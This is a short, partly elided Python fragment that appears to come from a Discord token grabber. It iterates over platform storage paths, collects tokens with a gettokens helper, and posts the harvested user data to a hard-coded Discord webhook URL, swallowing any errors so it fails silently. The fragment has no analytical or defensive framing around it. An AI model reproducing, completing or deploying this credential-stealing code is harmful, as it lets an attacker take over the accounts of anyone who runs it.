    ...
    for platform, path in PATHS.items():
        ...
        for token in gettokens(path):
            ...
            try:
                ...
                requests.post('https://discord.com/api/webhooks/1337534188060151812/pybaW-typNZoBSeoJCSjnR27Ihio4dAaM3mTBNMWRauSsjeD22FtKyXLm0KNotMx92RzOK_URL', json=embed_user, headers=getheaders())
            except:
                continue
